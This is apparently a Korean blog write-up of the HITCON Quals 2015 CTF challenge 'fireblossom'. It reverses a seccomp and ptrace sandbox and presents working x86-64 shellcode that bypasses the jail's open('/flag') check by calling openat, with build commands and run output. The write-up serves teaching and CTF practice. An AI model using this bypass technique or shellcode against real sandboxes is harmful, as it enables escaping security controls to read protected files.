---
layout: post
title: HITCON Quals 2015 - fireblossom
category: writeup
---

fireblossom은 misc 카테고리의 문제이다. 문제는 fireblossom과 fireblossom_claypot이라는 두 개의 ELF로 구성되어있고, nc 주소와 포트가 주어져있다.

### 1. Reverse claypot

fireblossom_claypot은 매우 작은 프로그램인데, 외부에서의 ptrace를 허용하고 코드를 읽은 뒤, 이를 실행해주는 것이 다이다.

![claypot.png](/assets/2015/10/claypot.png)

<!--more-->

### 2. Reverse fireblossom main

```c
int main()
{
  chroot(".");
  chdir("/");
  unshare(CLONE_NEWPID); // Now child processes get pid 1, 2, ...
  puts("Put seeds into the clay pot");

  int pid = fork();
  if (!pid) // child
  {
    int rand_id = get_randint_1050();
    set_uid_gid_10F0(rand_id);
    set_sandbox_1160();
    execve("./fireblossom_claypot", NULL, NULL);
  }
  else // parent
  {
    int success = interact_child_13F0(pid);
    if (success = -1)
    {
      puts("The fireblossom is killed");
      kill(pid, SIGKILL);
    }
    else
      puts("The fireblossom is blooming");
  }
}
```

fireblossom은 child process를 하나 생성하여 각종 sandbox 장치를 적용한 다음 fireblossom_claypot을 실행한 뒤, child process의 행동을 감시한다. 경우에 따라서는 child process를 강제로 종료시키기도 하는 것 같다.

### 3. Reverse fireblossom sandbox

```c
void set_sandbox_1160()
{
  // in the child's point of view, pid of itself is 1.
  prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);

  // syscall filter written in BPF.
  struct sock_filter filter[14] = {
    {32, 0, 0, 4},
    {21, 0, 2, 3221225534},
    {32, 0, 0, 0},
    {37, 0, 1, 308},
    {6, 0, 0, 0},
    {21, 7, 0, 56},
    {21, 6, 0, 57},
    {21, 5, 0, 58},
    {21, 4, 0, 62},
    {21, 3, 0, 157},
    {21, 2, 0, 200},
    {21, 1, 0, 234},
    {6, 0, 0, 2147418112},
    {6, 0, 0, 0}
  };
  struct sock_fprog fprog;
  fprog.len = 14;
  fprog.filter = filter;
  prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &fprog, 0, 0);
}
```

이 함수는 child process가 fireblossom_claypot을 실행하기 직전에 호출되는 함수인데, SECCOMP 필터를 써서 특정 syscall을 차단하도록 설정하고 있다.

[seccomp_filter](https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt) 문서에서는 prctl의 옵션이 `PR_SET_SECCOMP`와 `SECCOMP_MODE_FILTER`일 때 세 번째 파라미터가 `struct sock_fprog*`라고 되어있다.

[BPF](https://www.kernel.org/doc/Documentation/networking/filter.txt) 문서에 따르면 `struct sock_fprog`는 BPF(Berkley Packet FIlter)라는 형식이다. BPF는 seccomp에서 syscall을 필터링할 때도 쓰이고, 리눅스 커널이 네트워크 패킷을 필터링할 때에도 쓰인다고 한다.

문서를 보면 BPF는 load, conditional jump와 arithmetic instruction으로 이루어진 일종의 어셈블리 코드로 되어있고,  `bpf_dbg`를 쓰면 코드를 디스어셈블할 수 있다고 한다.

`bpf_dbg`는 <https://github.com/cloudflare/bpftools> 에서 다운받을 수 있다.

```
$ ./bpf_dbg
> load bpf 14, 32 0 0 4 , 21 0 2 3221225534 , 32 0 0 0 , 37 0 1 308 , 6 0 0 0 , 21 7 0 56 , 21 6 0 57 , 21 5 0 58 , 21 4 0 62 , 21 3 0 157 , 21 2 0 200 , 21 1 0 234 , 6 0 0 2147418112 , 6 0 0 0
> disassemble
l0:     ld [4]                   # data.arch
l1:     jeq #0xc000003e, l2, l4
l2:     ld [0]                   # data.nr
l3:     jgt #0x134, l4, l5
l4:     ret #0
l5:     jeq #0x38, l13, l6
l6:     jeq #0x39, l13, l7
l7:     jeq #0x3a, l13, l8
l8:     jeq #0x3e, l13, l9
l9:     jeq #0x9d, l13, l10
l10:    jeq #0xc8, l13, l11
l11:    jeq #0xea, l13, l12
l12:    ret #0x7fff0000
l13:    ret #0
```

seccomp filter에 들어오는 입력은 `struct seccomp_data`형식인데, [여기](http://lxr.free-electrons.com/source/include/uapi/linux/seccomp.h?v=3.14#L40)서 확인할 수 있다.

이 코드는 [이 문서](https://www.kernel.org/doc/Documentation/networking/filter.txt)의 "SECCOMP filter example"과 매우 비슷한데, syscall number가 clone, fork, vfork, kill, prctl, tkill, tgkill 이면 프로세스를 종료하고, 아니면 syscall을 허용하는 내용이다.

### 4. Reverse fireblossom jail

각종 error check는 생략하였다.

```c
int __fastcall interact_child(unsigned int pid)
{
  int status;
  char buf[4096];

  // Wait for the child to stop by SIGTRAP (int 3)
  waitpid(pid, &status, 0);
  if (!WIFSTOPPED(status) || WSTOPSIG(status) != SIGTRAP) return -1;

  while (1) {
    // Execute child until next syscall
    ptrace(PTRACE_SYSCALL, pid, 0, 0);
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)) break;

    struct user_regs_struct regs; 
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    if (regs.orig_rax == 2)         // syscall number is SYS_OPEN
    {
      struct iovec lvec;
      struct iovec rvec;
      int pos = 0;
      while (1)
      {
        lvec.iov_base = buf + pos;
        lvec.len = 1;
        rvec.iov_base = regs.rdi + pos;
        rvec.len = 1;
        process_vm_readv(pid, &lvec, 1, &rvec, 1, 0);
        if (buf[pos] == 0)
        {
          if (buf[0] != '/') {
            regs.rdi = -1;
          }
          else {
            char* path = realpath(buf);
            if (!path) return -1;
            if (!strcmp(path, "/flag"))
              regs.rdi = -1;
          }
          ptrace(PTRACE_SETREGS, pid, 0, &regs);
          break;
        }
        pos ++;
      }
    }
    ptrace(PTRACE_CONT, pid, 0);
  }
  return 0; 
}
```

처음에 child process가 ptrace로 trace를 허용하고 int 3으로 trap을 발생시키면 실행 흐름이 위 함수로 넘어온다. 그 다음부터는 child process가 syscall을 호출할 때까지 실행시키는데, 이때 "/flag"를 open하려고 했다면 프로그램을 종료시킨다. 그게 아니라면 다음 syscall을 호출할 때까지 기다리고 이를 반복한다.

### 5. Exploit

clone, fork가 차단되었기 때문에 다른 프로그램을 켤 수는 없다. prctl이 차단되어서 syscall 필터를 끌 수도 없다. open("/flag",0) 도 할 수 없다. 이럴 땐 openat syscall을 쓰면 된다.

```c
int openat(int dirfd, const char *pathname, int flags);
/* If pathname is relative path, it's relative from
   the directory described by dirfd.
   If pathname is absolute path, dirfd is ignored.
   Other aspects are exactly the same as open(). */
```

아래처럼 쉘코드를 만들자.

```nasm
global _start
section .start

_start:

  ; Linux x86-84 syscall convention
  ; syscall number in rax
  ; arguments in rdi, rsi, rdx, r10, r8, r9

  ; mmap is syscall #9
  ; void* buf = mmap(addr=NULL,
  ;                  length=4096,
  ;                  prot=7,       // RWE
  ;                  flags=0x22 ,  // MAP_PRIVATE | MAP_ANONYMOUS
  ;                  fd=0,
  ;                  offset=0);
  xor rdi, rdi
  mov rsi, 4096
  mov rdx, 7
  mov r10, 0x22
  mov r8, rdi
  mov r9, rdi
  push 9
  pop rax
  syscall
  push rax

  ; openat is syscall 257
  ; int fd = openat(dirfd=0,
  ;                 path="/flag",
  ;                 flags=0);       // O_RDONLY
  mov rdi, 0x00000067616c662f
  push rdi
  mov rsi, rsp
  xor rdi, rdi
  xor rdx, rdx
  push 257
  pop rax
  syscall

  ; at this point, stack has:
  ; buf address
  ; "/flag"

  ; read is syscall 0
  ; int n = read(fd, buf, 4096);
  mov rdi, rax
  pop rsi
  pop rsi
  push rsi
  mov rdx, 4096
  push 0
  pop rax
  syscall

  ; at this point, stack has:
  ; buf address

  ; write is syscall 1
  ; write(1, buf, n);
  mov rdi, 1
  pop rsi
  mov rdx, rax
  push 1
  pop rax
  syscall
```

쉘코드를 어셈블하고 fireblossom에 stdin으로 입력하면 키를 볼 수 있다.

```
$ ls
fireblossom*  fireblossom_claypot*  flag pay.s

$ nasm -felf64 -o pay.o pay.s
$ ld -o pay pay.o
$ objcopy -O binary --only-section=.start pay pay.bin

$ xxd pay.bin
0000000: 4831 ffbe 0010 0000 ba07 0000 0041 ba22  H1...........A."
0000010: 0000 0049 89f8 4989 f96a 0958 0f05 5048  ...I..I..j.X..PH
0000020: bf2f 666c 6167 0000 0057 4889 e648 31ff  ./flag...WH..H1.
0000030: 4831 d268 0101 0000 580f 0548 89c7 5e5e  H1.h....X..H..^^
0000040: 56ba 0010 0000 6a00 580f 05bf 0100 0000  V.....j.X.......
0000050: 5e48 89c2 6a01 580f 05                   ^H..j.X..

$ cat pay.bin | sudo ./fireblossom
Put seeds into the clay pot
This is test flag
The fireblossom is blooming
```


